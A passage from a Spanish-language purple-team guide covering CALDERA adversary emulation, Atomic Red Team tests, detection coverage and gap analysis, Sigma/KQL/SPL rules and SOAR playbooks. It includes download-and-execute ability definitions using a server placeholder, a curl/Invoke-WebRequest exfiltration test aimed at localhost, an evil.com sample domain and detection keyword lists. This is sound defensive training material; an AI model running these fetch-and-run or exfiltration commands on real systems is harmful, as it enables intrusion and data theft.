| cleanup | Limpieza post-ejecución | No |
| requirements | Prerrequisitos | No |
| privilege | Privilegio requerido | No |

**Adversaries** son perfiles de atacantes que agrupan abilities.

```yaml
name: APT29 Simulation
description: Simulación de APT29 (Cozy Bear)
atomic_ordering:
  - 12345678-1234-1234-1234-123456789012  # PowerShell download
  - 23456789-2345-2345-2345-234567890123  # Discovery commands
  - 34567890-3456-3456-3456-345678901234  # Credential dumping
  - 45678901-4567-4567-4567-456789012345  # Lateral movement
  - 56789012-5678-5678-5678-567890123456  # Exfiltration
tags:
  - apt29
  - cozydear
```

**Creación de un adversary personalizado para industria financiera:**

```yaml
name: FIN8 Simulation (Financial Sector)
description: Simula un ataque típico contra el sector financiero
atomic_ordering:
  # Initial Access - Spearphishing
  - 67890123-6789-6789-6789-678901234567  # T1566.001
  # Execution - PowerShell download
  - 12345678-1234-1234-1234-123456789012  # T1059.001
  # Persistence - Registry Run Key
  - 78901234-7890-7890-7890-789012345678  # T1547.001
  # Privilege Escalation - UAC Bypass
  - 89012345-8901-8901-8901-890123456789  # T1548.002
  # Credential Access - LSASS dump
  - 34567890-3456-3456-3456-345678901234  # T1003.001
  # Lateral Movement - SMB/WMI
  - 45678901-4567-4567-4567-456789012345  # T1021.002
  # Collection - Archive data
  - 01234567-0123-0123-0123-012345678901  # T1560.001
  # Exfiltration - HTTP POST
  - 56789012-5678-5678-5678-567890123456  # T1048.002
tags:
  - financial
  - ransomware
  - fin8
```

### 3.6 Operations y Facts

**Operations** son ejecuciones de un adversary contra uno o más agentes.

**Facts** son piezas de información que se recopilan durante la operación.

```python
import requests, json

CALDERA_URL = "http://localhost:8888"
API_KEY = "ADMIN123"

def create_operation(name, adversary_id, group="red"):
    headers = {"KEY": API_KEY, "Content-Type": "application/json"}
    payload = {
        "name": name,
        "adversary_id": adversary_id,
        "group": group,
        "autonomous": 1,
        "planner_id": "atomic",
        "state": "running"
    }
    resp = requests.post(f"{CALDERA_URL}/api/v2/operations",
                        headers=headers, json=payload)
    return resp.json()
```

**Facts comunes:**

| Fact | Descripción | Ejemplo |
|------|-------------|---------|
| server | [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) del servidor CALDERA | 192.168.1.100 |
| [payload](../raw/m3t4spl01t.md#payloads) | Nombre de [payload](../raw/m3t4spl01t.md#payloads) | [mimikatz](../raw/p4ssw0rd-4tt4cks.md#mimikatz).exe |
| domain | Dominio malicioso | evil.[com](../raw/w1n-s9bsyst3ms.md#com) |
| email | Email de target | user@company.com |
| username | Usuario para RDP | administrator |
| password | Password | P@ssw0rd |
| [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions) | [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions) de archivo | sha256:... |
| port | [puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) de conexión | 4444 |

### 3.7 Reporting en CALDERA

**Reportes disponibles:**
1. **Operation Report**: Detalles de una operación
2. **Coverage Report**: Mapeo de qué técnicas ATT&CK se cubrieron
3. **Agent Report**: Estado de cada agente
4. **Fact Report**: Facts recolectados

```python
def get_operation_report(operation_id):
    headers = {"KEY": API_KEY}
    resp = requests.get(f"{CALDERA_URL}/api/v2/reports/{operation_id}",
                       headers=headers)
    return resp.json()

def get_coverage(operation_id):
    headers = {"KEY": API_KEY}
    resp = requests.get(f"{CALDERA_URL}/api/v2/coverage",
                       headers=headers, params={"operation": operation_id})
    return resp.json()
```

### 3.8 REST API de CALDERA

```python
class CalderaAPI:
    def __init__(self, url="http://localhost:8888", api_key="ADMIN123"):
        self.url = url.rstrip("/")
        self.headers = {"KEY": api_key, "Content-Type": "application/json"}

    def list_agents(self):
        resp = requests.get(f"{self.url}/api/v2/agents", headers=self.headers)
        return resp.json()

    def list_abilities(self):
        resp = requests.get(f"{self.url}/api/v2/abilities", headers=self.headers)
        return resp.json()

    def create_adversary(self, name, ability_ids, description=""):
        payload = {"name": name, "description": description, "atomic_ordering": ability_ids}
        resp = requests.post(f"{self.url}/api/v2/adversaries",
                           headers=self.headers, json=payload)
        return resp.json()

    def create_operation(self, name, adversary_id, group="red", autonomous=True):
        payload = {
            "name": name,
            "adversary_id": adversary_id,
            "group": group,
            "autonomous": 1 if autonomous else 0,
            "planner_id": "atomic",
            "state": "running"
        }
        resp = requests.post(f"{self.url}/api/v2/operations",
                           headers=self.headers, json=payload)
        return resp.json()

    def run_operation_blocking(self, name, adversary_id, group="red", poll_interval=5):
        import time
        op = self.create_operation(name, adversary_id, group)
        op_id = op["id"]
        print(f"[*] Operation {op_id} iniciada...")
        while True:
            op_status = requests.get(f"{self.url}/api/v2/operations/{op_id}",
                                    headers=self.headers).json()
            if op_status.get("state") in ["finished", "error"]:
                break
            time.sleep(poll_interval)
        report = requests.get(f"{self.url}/api/v2/reports/{op_id}",
                             headers=self.headers).json()
        print(f"[+] Operation completada: {op_id}")
        return report


if __name__ == "__main__":
    api = CalderaAPI()
    agents = api.list_agents()
    print(f"Agentes: {len(agents)}")
    for agent in agents:
        print(f"  {agent['paw']} - {agent['platform']} - {agent['host']}")
```

### 3.9 Desarrollo de Abilities personalizadas

Crear una ability custom para una técnica no cubierta por stockpile:

```yaml
# abilities/custom/T1566.001.yaml
id: custom-1566-001
name: Spearphishing Attachment Simulation
description: Simula la descarga de un adjunto malicioso
tactic: initial-access
technique_id: T1566.001
technique_name: Spearphishing Attachment
platforms:
  windows:
    ps1:
      command: |
        $url = "http://#{server}/#{payload}"
        $output = "$env:TEMP\#{payload}"
        Invoke-WebRequest -Uri $url -OutFile $output
        Start-Process $output
      cleanup: |
        Remove-Item "$env:TEMP\#{payload}" -Force
  linux:
    sh:
      command: |
        wget http://#{server}/#{payload} -O /tmp/#{payload}
        chmod +x /tmp/#{payload}
        /tmp/#{payload}
      cleanup: |
        rm -f /tmp/#{payload}
privilege: USER
executor: ps1
```

## 4. Atomic [red team](../raw/r3d-t34m-1nfr4.md)

### 4.1 Qué es Atomic [red team](../raw/r3d-t34m-1nfr4.md)

Atomic [red](../raw/r3d3s-f0nd4m3nt0s.md) Team es una biblioteca de tests atómicos para [mitre att&ck](../raw/s3c-f0nd4m3nt0s.md#mitre-attck). Desarrollado por [red](../raw/r3d3s-f0nd4m3nt0s.md) Canary, permite probar detecciones de forma simple. Más de 750 tests, multiplataforma, automatizable con [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell).

**Por qué Atomic Red Team es esencial para Purple Teaming:**
1. **Tests estandarizados**: Cada técnica de ATT&CK tiene uno o más tests específicos
2. **Multiplataforma**: Windows, Linux, macOS cubiertos
3. **Fáciles de ejecutar**: Un comando de PowerShell y ya estás probando
4. **Auto-limpieza**: Los tests incluyen cleanup commands
5. **Integrable**: Funciona con CALDERA, con SIEM, con pipelines [ci/cd](../raw/c1cd-h4ck1ng.md)
6. **Open source**: Cualquiera puede contribuir o personalizar

**Diferencia entre Atomic Red Team y CALDERA:**
| Aspecto | Atomic Red Team | CALDERA |
|---------|----------------|---------|
| Enfoque | Tests atómicos individuales | Emulación de adversarios completa |
| Complejidad | Baja (cada test es independiente) | Alta (secuencia de TTPs) |
| Automatización | PowerShell module | [rest api](../raw/4p1-s3cur1ty.md#rest-api) + Planners |
| Dependencias | Ninguna | Servidor + Agentes |
| Ideal para | Validación rápida de reglas | Ejercicios complejos |

### 4.2 Instalación

```powershell
# Método 1: PowerShell Gallery (recomendado)
Install-Module -Name AtomicRedTeam -Scope CurrentUser -Force

# Método 2: Clonar repositorio
git clone https://github.com/redcanaryco/atomic-red-team.git
Import-Module .\atomic-red-team.psd1

# Instalar los atómicos localmente
Install-AtomicRedTeam -GetAtomics -Force

# Verificar instalación
Get-AtomicTechnique -ShowDetails
```

**Instalación en Linux:**
```bash
# Instalar PowerShell Core primero
wget -q https://packages.microsoft.com/config/ubuntu/$(lsb_release -rs)/packages-microsoft-prod.deb
sudo dpkg -i packages-microsoft-prod.deb
sudo apt-get install -y powershell
pwsh -Command "Install-Module -Name AtomicRedTeam -Scope CurrentUser -Force"
```

### 4.3 Estructura de un Atomic Test

```yaml
name: PowerShell Download Cradle
description: |
  Download a file using PowerShell's Invoke-WebRequest
supported_platforms:
  - windows
input_arguments:
  url:
    description: URL to download
    type: url
    default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1
  destination:
    description: Destination path
    type: path
    default: C:\Users\$env:username\AppData\Local\Temp\atomic.ps1
executor:
  command: |
    Invoke-WebRequest -Uri #{url} -OutFile #{destination}
  cleanup_command: |
    Remove-Item #{destination} -ErrorAction Ignore
  name: powershell
```

**Campos de un Atomic Test:**
| Campo | Descripción |
|-------|-------------|
| name | Nombre descriptivo |
| description | Explicación detallada |
| supported_platforms | windows, linux, macos |
| input_arguments | Variables del test (con defaults) |
| executor.command | Comando a ejecutar |
| executor.cleanup_command | Comando de limpieza |

**Ejemplo de test con dependencias:**
```yaml
name: Sharphound Enumeration
supported_platforms:
  - windows
input_arguments:
  sharphound_path:
    description: Path to Sharphound.exe
    type: path
    default: C:\Tools\Sharphound.exe
dependencies:
  - description: Sharphound must exist on disk
    prereq_command: |
      if (Test-Path #{sharphound_path}) { exit 0 } else { exit 1 }
    get_prereq_command: |
      Invoke-WebRequest -Uri "https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe" -OutFile #{sharphound_path}
executor:
  command: |
    #{sharphound_path} --collectionmethods All -o C:\Windows\Temp
  cleanup_command: |
    Remove-Item C:\Windows\Temp\*.zip -ErrorAction Ignore
  name: command_prompt
```

### 4.4 Ejecución de pruebas

```powershell
# Comandos básicos
Invoke-AtomicTest T1059.001 -TestNumbers 1
Invoke-AtomicTest T1003.001 -InputArgs @{url='http://test'}
Invoke-AtomicTest T1059.001 -Keep
Invoke-AtomicTest T1059.001 -Simulate
Invoke-AtomicTest -Tactic execution
Invoke-AtomicTest T1555.001 -CheckPrereqs
Invoke-AtomicTest T1059.001 -TimeoutSeconds 30
Invoke-AtomicTest T1059.001 -Verbose
```

**Ejecución avanzada:**
```powershell
# Ejecutar múltiples técnicas
$techniques = @('T1059.001', 'T1003.001', 'T1547.001')
foreach ($t in $techniques) {
    Write-Host "Ejecutando $t..." -ForegroundColor Cyan
    Invoke-AtomicTest $t -CheckPrereqs -Verbose
    Invoke-AtomicTest $t -Verbose
    Invoke-AtomicTest $t -Cleanup -Verbose
}

# Generar reporte en JSON
$results = Invoke-AtomicTest T1059.001 -Passthru
$results | ConvertTo-Json -Depth 5 | Out-File "atomic_results.json"
```

### 4.5 Creación de Atomics personalizados

```yaml
# atomics/custom/T9999.999.yaml
name: Custom Detection Test - Data Exfiltration
description: Simula exfiltración de datos mediante HTTP POST
supported_platforms:
  - windows
  - linux
input_arguments:
  exfil_url:
    description: URL del servidor de exfiltración
    type: url
    default: http://localhost:8080/exfil
executor:
  command: |
    if ($env:OS) {
      Invoke-WebRequest -Uri #{exfil_url} -Method POST -InFile C:\Windows\Temp\test_data.txt
    } else {
      curl -X POST -F "file=@/tmp/test_data.txt" #{exfil_url}
    }
  cleanup_command: |
    # No cleanup needed
  name: powershell
```

**Reglas para crear buenos Atomics:**
1. **Atómicos**: Un test, una técnica (no combinar técnicas)
2. **Determinísticos**: Mismo input debe producir mismo resultado
3. **Limpieza automática**: Siempre incluir cleanup
4. **Documentados**: Buena descripción del comportamiento
5. **No destructivos**: No deben causar daño permanente

### 4.6 Automatización con Invoke-AtomicRedTeam

```powershell
function Invoke-AtomicTestSuite {
    param(
        [string[]]$Techniques = @('T1059.001','T1003.001','T1547.001'),
        [string]$ReportPath = ".\atomic_report.json"
    )
    $results = @()
    foreach ($t in $Techniques) {
        Write-Host "`n=== Testing $t ===" -ForegroundColor Yellow
        Write-Host "  [*] Checking prerequisites..." -ForegroundColor Cyan
        $checkResult = Invoke-AtomicTest $t -CheckPrereqs -Verbose 2>&1
        $prereqsMet = $checkResult -notcontains "FAIL"
        if (-not $prereqsMet) {
            Write-Host "  [!] Installing prerequisites..." -ForegroundColor Yellow
            Invoke-AtomicTest $t -GetPrereqs -Verbose
        }
        Write-Host "  [*] Executing test..." -ForegroundColor Cyan
        $startTime = Get-Date
        try {
            $execResult = Invoke-AtomicTest $t -PassThru -TimeoutSeconds 60
            $success = $true
        } catch {
            $success = $false
            $execResult = $_.Exception.Message
        }
        $endTime = Get-Date
        $duration = ($endTime - $startTime).TotalSeconds
        Write-Host "  [*] Running cleanup..." -ForegroundColor Cyan
        Invoke-AtomicTest $t -Cleanup -Verbose
        $results += [PSCustomObject]@{
            Technique = $t
            Success = $success
            Duration = $duration
            Timestamp = $startTime
            Result = $execResult
        }
        Write-Host "  [+] $t completed in $($duration)s" -ForegroundColor Green
    }
    $report = @{
        timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
        total_techniques = $Techniques.Count
        successful = ($results | Where-Object Success).Count
        failed = ($results | Where-Object { -not $_.Success }).Count
        results = $results
    }
    $report | ConvertTo-Json -Depth 5 | Out-File $ReportPath
    Write-Host "`n[+] Report saved to $ReportPath" -ForegroundColor Green
    return $report
}

Invoke-AtomicTestSuite -Techniques @('T1059.001', 'T1003.001', 'T1547.001')
```

**Integración con CI/CD:**
```yaml
name: Atomic Red Team Tests
on:
  schedule:
    - cron: '0 6 * * 1'
  workflow_dispatch:
jobs:
  atomic-tests:
    runs-on: windows-latest
    steps:
      - name: Install Atomic Red Team
        run: |
          Install-Module -Name AtomicRedTeam -Scope CurrentUser -Force
          Install-AtomicRedTeam -GetAtomics -Force
      - name: Run tests
        run: |
          Import-Module AtomicRedTeam
          Invoke-AtomicTest T1059.001 -Passthru | Out-File results.json
      - name: Upload results
        uses: actions/upload-artifact@v3
        with:
          name: atomic-results
          path: results.json
```

## 5. Defense Evaluation

### 5.1 Mapeo de cobertura de detección

El mapeo de cobertura determina qué técnicas ATT&CK pueden ser detectadas. Es el core del purple teaming.

**Matriz de cobertura por táctica:**
| Táctica | Total | Cubierto | % |
|---------|-------|----------|---|
| Initial Access | 10 | 6 | 60% |
| Execution | 10 | 8 | 80% |
| Persistence | 10 | 5 | 50% |
| [privilege escalation](../raw/l1n9x-pr1v3sc.md) | 10 | 4 | 40% |
| Defense Evasion | 12 | 6 | 50% |
| Credential Access | 8 | 5 | 62.5% |
| Discovery | 10 | 7 | 70% |
| Lateral Movement | 8 | 4 | 50% |
| Collection | 6 | 3 | 50% |
| [c2](../raw/r3v3rs3-sh3lls.md#command-and-control) | 8 | 5 | 62.5% |
| Exfiltration | 6 | 2 | 33.3% |

**Herramienta de mapeo automatizado:**
```python
class CoverageMapper:
    def __init__(self):
        self.rules = {}
        self.coverage = {}

    def add_detection_rule(self, technique_id, rule_name, source, status="production"):
        if technique_id not in self.rules:
            self.rules[technique_id] = []
        self.rules[technique_id].append({"rule_name": rule_name, "source": source, "status": status})

    def add_technique(self, technique_id, name, tactic, risk="medium"):
        self.coverage[technique_id] = {
            "name": name, "tactic": tactic, "risk": risk,
            "has_detection": technique_id in self.rules,
            "rules": self.rules.get(technique_id, [])
        }

    def get_coverage_by_tactic(self, tactic):
        techniques = {k: v for k, v in self.coverage.items() if v["tactic"] == tactic}
        total = len(techniques)
        covered = sum(1 for t in techniques.values() if t["has_detection"])
        return {"tactic": tactic, "total": total, "covered": covered,
                "coverage_pct": round(covered / total * 100, 1) if total > 0 else 0}

    def full_report(self):
        tactics = set(t["tactic"] for t in self.coverage.values())
        return {
            "by_tactic": {t: self.get_coverage_by_tactic(t) for t in sorted(tactics)},
            "overall": {
                "total": len(self.coverage),
                "covered": sum(1 for t in self.coverage.values() if t["has_detection"]),
                "gaps": [k for k, v in self.coverage.items() if not v["has_detection"]]
            }
        }
```

### 5.2 Gap Analysis

Identificar técnicas sin cobertura de detección y priorizarlas por riesgo:

```python
class GapAnalyzer:
    def analyze(self, coverage, risk_matrix):
        gaps = {}
        for technique, risk in risk_matrix.items():
            if technique not in coverage:
                gaps[technique] = {
                    "risk": risk,
                    "priority": {"critical": 10, "high": 7, "medium": 4, "low": 1}[risk],
                    "action": f"Crear regla de detección para {technique}"
                }
        return dict(sorted(gaps.items(), key=lambda x: x[1]["priority"], reverse=True))
```

**Matriz de priorización de gaps:**
| Prioridad | Técnica | Riesgo | Impacto Potencial | Esfuerzo Estimado |
|-----------|---------|--------|-------------------|-------------------|
| 10 | T1003.001 | Critical | Robo de todas las credenciales del dominio | 4-8 horas |
| 10 | T1059.001 | Critical | Ejecución remota de código | 2-4 horas |
| 7 | T1566.001 | High | Compromiso inicial de usuarios | 8-16 horas |
| 7 | T1078.004 | High | Acceso no autorizado a [cloud](../raw/cl0ud-h4ck1ng.md) | 4-8 horas |
| 4 | T1547.001 | Medium | [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia) en endpoints | 2-4 horas |

### 5.3 Efectividad de controles

| Control | Detection Rate | FP Rate | F1 Score |
|---------|---------------|---------|----------|
| [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell) Logging | 0.95 | 0.05 | 0.95 |
| [sysmon](../raw/3dr-3v4s10n.md#sysmon) Process | 0.85 | 0.10 | 0.87 |
| Network Detection | 0.75 | 0.15 | 0.79 |
| EDR Alerting | 0.90 | 0.08 | 0.91 |

```python
class ControlEffectiveness:
    def __init__(self):
        self.controls = {}

    def add_test_run(self, control_name, technique, detected, alert_generated):
        if control_name not in self.controls:
            self.controls[control_name] = {"tests": [], "tp": 0, "fp": 0, "fn": 0}
        ctrl = self.controls[control_name]
        if detected and alert_generated: ctrl["tp"] += 1
        elif detected and not alert_generated: ctrl["fn"] += 1

    def get_metrics(self, control_name):
        ctrl = self.controls.get(control_name, {})
        tp, fp, fn = ctrl.get("tp", 0), ctrl.get("fp", 0), ctrl.get("fn", 0)
        total = tp + fn
        if total == 0: return {"error": "No tests"}
        detection_rate = tp / total
        precision = tp / (tp + fp) if (tp + fp) > 0 else 0
        f1 = 2 * (precision * detection_rate) / (precision + detection_rate) if (precision + detection_rate) > 0 else 0
        return {"control": control_name, "detection_rate": round(detection_rate, 3),
                "precision": round(precision, 3), "f1_score": round(f1, 3)}

    def weakness_analysis(self):
        weaknesses = []
        for ctrl_name in self.controls:
            metrics = self.get_metrics(ctrl_name)
            if "error" not in metrics:
                if metrics["detection_rate"] < 0.8:
                    weaknesses.append({"control": ctrl_name, "issue": "Baja tasa de detección"})
                if metrics["precision"] < 0.8:
                    weaknesses.append({"control": ctrl_name, "issue": "Alta tasa de falsos positivos"})
        return weaknesses
```

### 5.4 Matriz de cobertura visual

```
TÁCTICA          ████████████████████░░ 80%
Execution        ████████████████░░░░░░ 60%
Persistence      ████████████████████░░ 80%
PrivEsc          ████████████░░░░░░░░░░ 40%
Defense Evasion  ██████████████░░░░░░░░ 50%
Credential       ██████████████████░░░░ 70%
Discovery        ████████████████░░░░░░ 60%
Lateral Move     ██████████████░░░░░░░░ 50%
Collection       ████████████░░░░░░░░░░ 40%
C2               ██████████████████░░░░ 70%
Exfiltration     ██████████░░░░░░░░░░░░ 30%
```

```python
def generate_heatmap(coverage_data):
    heatmap = "HEATMAP DE COBERTURA DE DETECCIÓN\n" + "="*50 + "\n"
    for tactic, data in sorted(coverage_data.items()):
        pct = data["coverage_pct"]
        bar_length = int(pct / 5)
        bar = "█" * bar_length + "░" * (20 - bar_length)
        heatmap += f"{tactic:20} {bar} {pct:5.1f}%\n"
    return heatmap
```

## 6. [purple team](../raw/p9rpl3-t34m.md) Exercises

### 6.1 Planificación de ejercicios

**Checklist de planificación:**
```
## Checklist de Planificación de Ejercicio Purple Team

### Semana 1: Preparación
[ ] Seleccionar 3-5 técnicas de ATT&CK
[ ] Definir objetivos medibles
[ ] Identificar stakeholders
[ ] Preparar entorno de pruebas
[ ] Verificar sensores activos
[ ] Configurar dashboards de monitoreo
[ ] Establecer canal de comunicación

### Semana 2: Validación
[ ] Ejecutar pruebas de conectividad
[ ] Verificar generación de logs
[ ] Probar reglas SIEM existentes
[ ] Ajustar falsos positivos conocidos
[ ] Briefing con el equipo

### Semana 3: Ejecución
[ ] Día 1: Técnicas de Execution (T1059)
[ ] Día 2: Técnicas de Credential Access (T1003)
[ ] Día 3: Técnicas de Persistence (T1547)
[ ] Día 4: Técnicas de Lateral Movement (T1021)
[ ] Día 5: Review y documentación
```

**Ejemplo de plan con CALDERA:**
```python
def execute_purple_exercise(caldera_api, technique_id, target_group="red"):
    print(f"{'='*60}")
    print(f"PURPLE TEAM EXERCISE: {technique_id}")
    print(f"{'='*60}")

    abilities = caldera_api.list_abilities()
    technique_abilities = [a for a in abilities if a.get("technique_id") == technique_id]
    if not technique_abilities:
        print(f"[RED] No hay abilities para {technique_id}")
        return

    ability_id = technique_abilities[0]["id"]
    adv = caldera_api.create_adversary(name=f"Exercise_{technique_id}", ability_ids=[ability_id])

    start_time = time.time()
    result = caldera_api.run_operation_blocking(
        name=f"Purple_{technique_id}_{int(start_time)}",
        adversary_id=adv["id"], group=target_group
    )
    end_time = time.time()

    detected = result.get("detected", False)
    ttd = end_time - start_time
    status = "PASS" if detected else "FAIL"
    print(f"\n[RESULT] {technique_id}: {status} (TTD: {ttd:.2f}s)")
    return {"technique": technique_id, "detected": detected, "ttd": ttd, "status": status}
```

### 6.2 Ejecución de ejercicios

```python
class PurpleExercise:
    def __init__(self, technique_id, procedure):
        self.technique = technique_id
        self.procedure = procedure
        self.detected = False
        self.mttd = 0
        self.alerts = []

    def execute(self):
        print(f"[RED] Ejecutando {self.technique}: {self.procedure}")
        import time
        start = time.time()
        # Aquí se ejecuta el TTP real
        end = time.time()
        self.execution_time = end - start
        print(f"[RED] Técnica ejecutada en {self.execution_time:.2f}s")

    def blue_feedback(self, detected, alert_ids, time_to_detect):
        self.detected = detected
        self.alerts = alert_ids
        self.mttd = time_to_detect
        print(f"[BLUE] Detectado: {detected}, TTD: {time_to_detect:.2f}s")

    def report(self):
        return {
            "technique": self.technique, "procedure": self.procedure,
            "detected": self.detected, "mttd": self.mttd,
            "alerts": self.alerts, "status": "PASS" if self.detected else "FAIL"
        }
```

**Flujo de comunicación [red](../raw/r3d3s-f0nd4m3nt0s.md)-Blue:**
```
Time: 10:00 - [RED] Inicia técnica T1059.001
Time: 10:02 - [BLUE] ¿Están ejecutando algo?
Time: 10:02 - [RED] Sí, T1059.001 - PowerShell execution
Time: 10:03 - [BLUE] Confirmado, alerta EventID 4104 detectado
Time: 10:04 - [BLUE] Regla "PowerShell_ScriptBlock_Logging" alertó correctamente
Time: 10:05 - [RED] Técnica completa. TTD: 2 minutos. Status: PASS
```

### 6.3 Medición de resultados

```python
class ExerciseMetrics:
    def __init__(self):
        self.results = []

    def add_result(self, technique, detected, ttd, severity="medium"):
        self.results.append({"technique": technique, "detected": detected, "ttd": ttd, "severity": severity})

    def summary(self):
        total = len(self.results)
        detected = sum(1 for r in self.results if r["detected"])
        avg_ttd = sum(r["ttd"] for r in self.results if r["detected"]) / max(detected, 1)
        return {
            "total_techniques": total, "detected": detected, "missed": total - detected,
            "detection_rate": round(detected / total * 100, 1),
            "avg_ttd": round(avg_ttd, 1),
            "by_severity": {s: {"total": sum(1 for r in self.results if r["severity"] == s),
                                "detected": sum(1 for r in self.results if r["severity"] == s and r["detected"])}
                           for s in ["critical", "high", "medium", "low"]}
        }

    def print_report(self):
        s = self.summary()
        print(f"{'='*50}")
        print(f"RESUMEN DE EJERCICIO PURPLE TEAM")
        print(f"{'='*50}")
        print(f"Técnicas probadas: {s['total_techniques']}")
        print(f"Detectadas: {s['detected']} ({s['detection_rate']}%)")
        print(f"No detectadas: {s['missed']}")
        print(f"TTD promedio: {s['avg_ttd']} segundos")
        for technique in self.results:
            status = "PASS" if technique["detected"] else "FAIL"
            print(f"  [{status}] {technique['technique']} - TTD: {technique['ttd']}s")
```

### 6.4 Ciclo de reporte

**Estructura del reporte purple team:**

1. **Resumen ejecutivo** (1 página)
2. **Metodología** - TTPs seleccionados, entorno, herramientas
3. **Resultados detallados** - Por técnica: procedimiento, detección, TTD, alertas
4. **Recomendaciones** - Reglas SIEM a crear, ajustes de seguridad, próximos pasos
5. **Métricas** - Detection rate por táctica, MTTD, MTTR, coverage matrix

## 7. SIEM Tuning

### 7.1 Creación de reglas de detección

El [proceso](../raw/0s-f0nd4m3nt0s.md#procesos): Identificar técnica sin cobertura -> definir logs -> crear regla -> probar -> validar -> ajustar -> producción.

```python
class DetectionRulePipeline:
    def __init__(self):
        self.rules = []

    def create_from_gap(self, technique_id, gap_info):
        templates = {
            "T1059.001": {
                "name": f"PowerShell_Suspicious_Activity_{technique_id}",
                "kql_query": """
DeviceProcessEvents | where Timestamp > ago(24h)
| where FileName in~ ("powershell.exe", "pwsh.exe")
| where ProcessCommandLine contains "-enc" or ProcessCommandLine contains "DownloadString"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| sort by Timestamp desc
""",
                "spl_query": """
index=windows sourcetype=WinEventLog:Microsoft-Windows-PowerShell/Operational
EventCode=4104 ScriptBlockText IN ("*-enc*", "*DownloadString*", "*IEX *")
| table _time, host, AccountName, ScriptBlockText
""",
                "logging_required": ["PowerShell ScriptBlock Logging (EventID 4104)"]
            },
            "T1003.001": {
                "name": f"LSASS_Credential_Dumping_{technique_id}",
                "logging_required": ["Sysmon EventID 10 (ProcessAccess)"]
            }
        }
        template = templates.get(technique_id, self._generate_generic_rule(technique_id))
        rule = {"technique": technique_id, **template, "status": "draft", "false_positives": []}
        self.rules.append(rule)
        return rule
```

### 7.2 Reducción de falsos positivos

```python
class FalsePositiveTuning:
    def __init__(self):
        self.whitelist = {
            "processes": ["C:\\Program Files\\*\\MonitoringHost.exe", "C:\\Windows\\System32\\sdiagnhost.exe"],
            "users": ["NT AUTHORITY\\SYSTEM", "NT AUTHORITY\\NETWORK SERVICE"],
            "hosts": ["*-dev-*", "*-test-*"],
            "commands": ["*Get-WinEvent*", "*Get-Service*", "*Get-Process*"]
        }
        self.fp_log = []

    def add_false_positive(self, rule_name, alert_id, reason, source):
        self.fp_log.append({"rule": rule_name, "alert_id": alert_id, "reason": reason, "source": source})

    def analyze_fp_pattern(self, rule_name):
        related_fps = [fp for fp in self.fp_log if fp["rule"] == rule_name]
        if not related_fps: return {"has_fp": False}
        from collections import Counter
        reasons = Counter(fp["reason"] for fp in related_fps)
        return {"has_fp": True, "total_fps": len(related_fps),
                "top_reasons": reasons.most_common(5),
                "recommendation": self._suggest_tuning(rule_name, reasons)}
```

### 7.3 [sigma](../raw/thr3t-hnt.md#sigma) Rules

```yaml
title: PowerShell ScriptBlock Logging Detection
id: 12345678-1234-1234-1234-123456789012
status: test
description: Detects suspicious PowerShell script blocks
author: Purple Team
date: 2025/01/01
tags:
  - attack.t1059.001
  - attack.execution
logsource:
  product: windows
  service: powershell
detection:
  selection:
    EventID: 4104
    ScriptBlockText|contains:
      - '-enc'
      - 'DownloadString'
      - 'IEX'
      - 'Invoke-WebRequest'
      - '-Exec Bypass'
  condition: selection
falsepositives:
  - Administrative scripts
  - Legitimate automation tools
level: high
```

**Conversión de Sigma a otros formatos:**
```bash
sigma convert -t splunk -f detection_rule.yml
sigma convert -t elk -f detection_rule.yml
sigma convert -t qradar -f detection_rule.yml
sigma convert -t microsoft365defender -f detection_rule.yml
```

### 7.4 KQL y SPL para detección

**KQL ([azure](../raw/cl0ud-h4ck1ng.md#azure) Sentinel):**
```kql
// Detectar PowerShell download cradle
DeviceProcessEvents
| where Timestamp > ago(24h)
| where FileName in~ ("powershell.exe", "pwsh.exe")
| where ProcessCommandLine contains "-enc"
    or ProcessCommandLine contains "DownloadString"
    or ProcessCommandLine contains "IEX "
    or ProcessCommandLine contains "Invoke-WebRequest"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| sort by Timestamp desc
```

```kql
// Detectar Mimikatz
SecurityEvent
| where TimeGenerated > ago(1d)
| where EventID == 4663
| where ProcessName contains "mimikatz" or ProcessName contains "procdump"
| project TimeGenerated, Computer, Account, ProcessName, ObjectName
```

**SPL (Splunk):**
```splunk
index=windows sourcetype=WinEventLog:Microsoft-Windows-PowerShell/Operational
EventCode=4104
ScriptBlockText IN ("*-enc*", "*DownloadString*", "*IEX *", "*-Exec Bypass*")
| table _time, host, AccountName, ScriptBlockText
| sort - _time
```

### 7.5 Correlación de eventos

```kql
// Correlación: PowerShell download + network + process
let PowerShellDownloads = DeviceProcessEvents
| where FileName has "powershell" and ProcessCommandLine contains "DownloadString"
| project Timestamp, DeviceId, ProcessId, ProcessCommandLine;
let NetworkConnections = DeviceNetworkEvents
| where RemotePort == 443 or RemotePort == 80
| project Timestamp, DeviceId, InitiatingProcessId, RemoteUrl;
PowerShellDownloads
| join kind=inner NetworkConnections on DeviceId, ProcessId
| where datetime_diff("second", NetworkConnections.Timestamp, PowerShellDownloads.Timestamp) between (0..30)
| project PowerShellDownloads.Timestamp, DeviceId, ProcessCommandLine, RemoteUrl
```

## 8. SOAR Integration

### 8.1 Automatización de respuesta

**Ciclo SOAR típico:**
```
Alerta SIEM → Enriquecimiento → Decisión → Acción → Cierre
```

### 8.2 Playbooks de respuesta

```yaml
name: PowerShell Malicious Detection Response
trigger:
  - sigma_rule: powershell_suspicious_scriptblock
  - siem_alert: PowerShell_Encoded_Command
steps:
  - id: enrichment
    type: parallel
    actions:
      - name: get_process_details; integration: edr; action: get_process_tree
      - name: get_user_context; integration: active_directory; action: get_user_details
      - name: check_threat_intel; integration: threat_intel; action: check_hash
  - id: decision
    type: condition
    if:
      - condition: user_is_admin AND process_unknown; action: isolate_endpoint
      - condition: known_legitimate_tool; action: close_as_false_positive
      - condition: threat_intel_match; action: critical_incident
  - id: actions
    type: sequential
    steps:
      - action: isolate_endpoint; integration: edr
      - action: block_hash; integration: firewall
